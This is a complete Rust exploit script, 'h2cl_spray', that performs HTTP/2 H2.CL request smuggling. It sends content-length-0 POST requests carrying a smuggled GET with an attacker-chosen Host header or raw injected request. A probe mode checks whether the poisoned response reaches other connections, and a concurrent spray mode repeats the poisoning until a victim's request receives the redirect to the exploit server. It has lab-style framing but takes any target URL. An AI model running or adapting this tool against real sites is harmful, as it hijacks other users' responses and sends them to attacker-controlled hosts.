#!/usr/bin/env rust-script
//! name: h2cl_spray
//! description: H2.CL poison spray + cross-connection leak probe - arms a CL:0 h2 request carrying a smuggled inner request (default GET /resources with a caller Host, whose lab response is the Host-derived 302 redirect) over many short-lived h2 connections, optionally holding/closing the arm connection and probing from a separate connection, so a response left pending on a pooled back-end connection is either proven reachable from another client connection or sprayed until a victim request consumes it.
//! version: 1.0.0
//! args: <url> [--inner-path /resources] [--exploit-host H] [--mode probe|spray] [--connections N] [--concurrency C] [--seconds N] [--hold-ms N] [--gap-ms N] [--probe-path /] [--read-ms N] [--goaway] [--quiet] [--selftest]
//! keywords: h2, http2, smuggling, h2cl, desync, response-queue, poison, spray, redirect, hunter
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::ClientConfig;
use tokio_rustls::TlsConnector;

struct Cfg {
    host: String,
    port: u16,
    authority: String,
    inner_path: String,
    inner_raw: Option<String>,
    exploit_host: String,
    probe_path: String,
    read_ms: u64,
    goaway: bool,
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let f = frame(0x1, 0x5, 3, b"abcd");
        let inner = inner_request("/resources", "exploit.example");
        let ok = f.len() == 13 && inner.ends_with("\r\n\r\n") && inner.starts_with("GET /resources HTTP/1.1");
        pi_rust_lib::report::success(
            "h2cl_spray",
            json!({"selftest": if ok { "ok" } else { "fail" }, "inner": inner}),
            "frame + inner_request roots",
        )
        .unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut url = String::new();
    let mut inner_path = "/resources".to_string();
    let mut inner_raw: Option<String> = None;
    let mut exploit_host = String::new();
    let mut mode = "probe".to_string();
    let mut connections: usize = 6;
    let mut concurrency: usize = 4;
    let mut seconds: f64 = 30.0;
    let mut hold_ms: u64 = 0;
    let mut gap_ms: u64 = 150;
    let mut probe_path = "/?cb=1".to_string();
    let mut read_ms: u64 = 2500;
    let mut goaway = false;
    let mut quiet = false;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--inner-path" => {
                i += 1;
                inner_path = args.get(i).cloned().unwrap_or(inner_path);
            }
            "--inner-raw" => {
                i += 1;
                inner_raw = args.get(i).map(|s| unescape(s));
            }
            "--exploit-host" => {
                i += 1;
                exploit_host = args.get(i).cloned().unwrap_or_default();
            }
            "--mode" => {
                i += 1;
                mode = args.get(i).cloned().unwrap_or(mode);
            }
            "--connections" => {
                i += 1;
                connections = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(connections);
            }
            "--concurrency" => {
                i += 1;
                concurrency = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(concurrency);
            }
            "--seconds" => {
                i += 1;
                seconds = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(seconds);
            }
            "--hold-ms" => {
                i += 1;
                hold_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(hold_ms);
            }
            "--gap-ms" => {
                i += 1;
                gap_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(gap_ms);
            }
            "--probe-path" => {
                i += 1;
                probe_path = args.get(i).cloned().unwrap_or(probe_path);
            }
            "--read-ms" => {
                i += 1;
                read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms);
            }
            "--goaway" => goaway = true,
            "--quiet" => quiet = true,
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }

    if url.is_empty() || (exploit_host.is_empty() && inner_raw.is_none()) {
        pi_rust_lib::report::failure(
            "h2cl_spray",
            "usage",
            "call as: h2cl_spray <url> --exploit-host H [--mode probe|spray] [--inner-path /resources]",
        );
        std::process::exit(2);
    }

    let parsed = url::Url::parse(&url).unwrap_or_else(|_| url::Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(443);
    let cfg = Arc::new(Cfg {
        authority: host.clone(),
        host,
        port,
        inner_path,
        inner_raw,
        exploit_host,
        probe_path,
        read_ms,
        goaway,
    });

    let deadline: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(seconds + 30.0);
    let budget = Duration::from_secs_f64(deadline);
    let run: std::pin::Pin<Box<dyn std::future::Future<Output = Result<Value, String>>>> = if mode == "spray" {
        Box::pin(run_spray(cfg.clone(), connections, concurrency, seconds, hold_ms, gap_ms, quiet))
    } else {
        Box::pin(run_probe(cfg.clone(), connections, hold_ms, gap_ms, quiet))
    };

    match tokio::time::timeout(budget, run).await {
        Ok(Ok(v)) => {
            let next = "a probe status of 302 to the exploit server means the pending response is reachable from another connection; otherwise keep spraying until the victim consumes it";
            pi_rust_lib::report::success("h2cl_spray", v, next).unwrap_or(());
        }
        Ok(Err(e)) => {
            pi_rust_lib::report::failure("h2cl_spray", &e, "check the arm frames and the read window");
            std::process::exit(1);
        }
        Err(_) => {
            pi_rust_lib::report::failure("h2cl_spray", &format!("deadline {deadline}s reached"), "raise PI_TIMEOUT_SECS");
            std::process::exit(1);
        }
    }
}

fn inner_request(path: &str, host: &str) -> String {
    format!("GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n")
}

async fn connect(cfg: &Cfg) -> Result<tokio_rustls::client::TlsStream<TcpStream>, String> {
    let mut roots = tokio_rustls::rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    let connector = TlsConnector::from(Arc::new(config));
    let server_name = ServerName::try_from(cfg.host.clone()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((cfg.host.as_str(), cfg.port)).await.map_err(|e| format!("connect: {e}"))?;
    let mut tls = connector.connect(server_name, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n").await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(tls)
}

async fn arm_once(cfg: &Cfg, hold_ms: u64) -> Result<(Option<String>, usize), String> {
    let mut tls = connect(cfg).await?;
    let inner = match &cfg.inner_raw {
        Some(raw) => raw.clone(),
        None => inner_request(&cfg.inner_path, &cfg.exploit_host),
    };
    send_stream(&mut tls, 1, &cfg.authority, "POST", "/", &[("content-length", "0")], Some(&inner)).await?;
    let (status, _location, _body) = read_until(&mut tls, 1, cfg.read_ms).await?;
    if hold_ms > 0 {
        tokio::time::sleep(Duration::from_millis(hold_ms)).await;
    }
    let mut left = 0usize;
    if cfg.goaway {
        let _ = tls.write_all(&frame(7, 0, 0, &[0, 0, 0, 0, 0, 0, 0, 0])).await;
        let _ = tls.flush().await;
    }
    // count any bytes still readable (the pending smuggled response stays on the back-end, not here)
    let mut buf = [0u8; 256];
    while let Ok(Ok(n)) = tokio::time::timeout(Duration::from_millis(60), tls.read(&mut buf)).await {
        if n == 0 {
            break;
        }
        left += n;
    }
    let _ = tls.shutdown().await;
    Ok((status, left))
}

async fn probe_once(cfg: &Cfg) -> Result<(Option<String>, Option<String>), String> {
    let mut tls = connect(cfg).await?;
    send_stream(&mut tls, 1, &cfg.authority, "GET", &cfg.probe_path, &[], None).await?;
    let (status, location, _body) = read_until(&mut tls, 1, cfg.read_ms).await?;
    let _ = tls.shutdown().await;
    Ok((status, location))
}

async fn run_probe(cfg: Arc<Cfg>, connections: usize, hold_ms: u64, gap_ms: u64, quiet: bool) -> Result<Value, String> {
    let started = Instant::now();
    let mut arms_ok = 0usize;
    let mut arm_statuses: Vec<String> = Vec::new();
    let mut probe_statuses: Vec<String> = Vec::new();
    let mut probe_locations: Vec<String> = Vec::new();
    for n in 0..connections {
        match arm_once(&cfg, hold_ms).await {
            Ok((st, left)) => {
                arms_ok += 1;
                let label = st.unwrap_or_else(|| "-".into());
                if !quiet {
                    eprintln!("arm {} status={} leftover_bytes={}", n + 1, label, left);
                }
                arm_statuses.push(label);
            }
            Err(e) => {
                if !quiet {
                    eprintln!("arm {} error: {}", n + 1, e);
                }
            }
        }
        if gap_ms > 0 {
            tokio::time::sleep(Duration::from_millis(gap_ms)).await;
        }
        match probe_once(&cfg).await {
            Ok((st, loc)) => {
                let st = st.unwrap_or_else(|| "-".into());
                if !quiet {
                    eprintln!("probe {} status={} location={}", n + 1, st, loc.clone().unwrap_or_default());
                }
                probe_statuses.push(st);
                probe_locations.push(loc.unwrap_or_default());
            }
            Err(e) => {
                if !quiet {
                    eprintln!("probe {} error: {}", n + 1, e);
                }
                probe_statuses.push("err".into());
                probe_locations.push(String::new());
            }
        }
    }
    let leaks = probe_statuses.iter().filter(|s| s.as_str() == "302").count();
    Ok(json!({
        "mode": "probe",
        "arms_ok": arms_ok,
        "arm_statuses": arm_statuses,
        "probe_statuses": probe_statuses,
        "probe_locations": probe_locations,
        "leaks": leaks,
        "elapsed_ms": started.elapsed().as_millis() as u64,
    }))
}

async fn run_spray(cfg: Arc<Cfg>, connections: usize, concurrency: usize, seconds: f64, hold_ms: u64, gap_ms: u64, quiet: bool) -> Result<Value, String> {
    let started = Instant::now();
    let mut arms_sent = 0usize;
    let mut arm_errors = 0usize;
    let mut probe_statuses: Vec<String> = Vec::new();
    let conc = concurrency.max(1);
    let mut remaining = connections;
    while remaining > 0 {
        let batch = remaining.min(conc);
        let mut tasks = Vec::new();
        for _ in 0..batch {
            let c = cfg.clone();
            tasks.push(tokio::spawn(async move { arm_once(&c, hold_ms).await }));
        }
        for t in tasks {
            match t.await {
                Ok(Ok(_)) => arms_sent += 1,
                _ => arm_errors += 1,
            }
        }
        remaining -= batch;
        if gap_ms > 0 {
            tokio::time::sleep(Duration::from_millis(gap_ms)).await;
        }
        if elapsed_secs(&started) >= seconds {
            break;
        }
    }
    // one probe after the spray burst to measure whether the poison is reachable cross-connection
    match probe_once(&cfg).await {
        Ok((st, loc)) => {
            probe_statuses.push(st.unwrap_or_else(|| "-".into()));
            if !quiet {
                eprintln!("final probe location={}", loc.unwrap_or_default());
            }
        }
        Err(_) => probe_statuses.push("err".into()),
    }
    if !quiet {
        eprintln!("spray done: arms={} errors={} elapsed={:.1}s", arms_sent, arm_errors, elapsed_secs(&started));
    }
    Ok(json!({
        "mode": "spray",
        "arms_sent": arms_sent,
        "arm_errors": arm_errors,
        "probe_statuses": probe_statuses,
        "elapsed_secs": (elapsed_secs(&started) * 10.0).round() / 10.0,
    }))
}

fn elapsed_secs(started: &Instant) -> f64 {
    started.elapsed().as_secs_f64()
}

async fn send_stream<S: AsyncReadExt + AsyncWriteExt + Unpin>(
    tls: &mut S,
    sid: u32,
    authority: &str,
    method: &str,
    path: &str,
    headers: &[(&str, &str)],
    data: Option<&str>,
) -> Result<(), String> {
    let mut hdrs: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), method.as_bytes().to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), authority.as_bytes().to_vec()),
        (b":path".to_vec(), path.as_bytes().to_vec()),
    ];
    for (n, v) in headers {
        hdrs.push((n.as_bytes().to_vec(), v.as_bytes().to_vec()));
    }
    let block = hpack::Encoder::new().encode(hdrs.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    let mut flags = 0x4u8; // END_HEADERS
    if data.is_none() {
        flags |= 0x1; // END_STREAM
    }
    tls.write_all(&frame(1, flags, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    if let Some(body) = data {
        tls.write_all(&frame(0, 0x1, sid, body.as_bytes())).await.map_err(|e| format!("data: {e}"))?;
    }
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

async fn read_until<S: AsyncReadExt + AsyncWriteExt + Unpin>(
    stream: &mut S,
    want: u32,
    read_ms: u64,
) -> Result<(Option<String>, Option<String>, String), String> {
    let mut body = String::new();
    let mut status: Option<String> = None;
    let mut location: Option<String> = None;
    let mut decoder = hpack::Decoder::new();
    let mut pending: std::collections::BTreeMap<u32, (Vec<u8>, bool)> = std::collections::BTreeMap::new();
    let idle = Duration::from_millis(read_ms.max(300));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, stream.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, stream.read_exact(&mut payload)).await.is_err() {
            break;
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = stream.flush().await;
                }
            }
            1 | 9 => {
                let e = pending.entry(sid).or_insert_with(|| (Vec::new(), false));
                e.0.extend_from_slice(&payload);
                if flags & 0x4 != 0 {
                    e.1 = true;
                }
                if e.1 {
                    let block = e.0.clone();
                    pending.remove(&sid);
                    if let Ok(hs) = decoder.decode(&block) {
                        if sid == want {
                            status = hs.iter().find(|(n, _)| n == b":status").map(|(_, v)| String::from_utf8_lossy(v).to_string());
                            location = hs.iter().find(|(n, _)| n == b"location").map(|(_, v)| String::from_utf8_lossy(v).to_string());
                            if flags & 0x1 != 0 {
                                break;
                            }
                        }
                    }
                }
            }
            0 => {
                if sid == want {
                    body.push_str(&String::from_utf8_lossy(&payload));
                    if flags & 0x1 != 0 {
                        break;
                    }
                }
            }
            3 => {
                if sid == want {
                    break;
                }
            }
            _ => {}
        }
    }
    Ok((status, location, body))
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

fn unescape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.next() {
                Some('r') => out.push('\r'),
                Some('n') => out.push('\n'),
                Some('t') => out.push('\t'),
                Some('\\') => out.push('\\'),
                Some(other) => {
                    out.push('\\');
                    out.push(other);
                }
                None => out.push('\\'),
            }
        } else {
            out.push(c);
        }
    }
    out
}
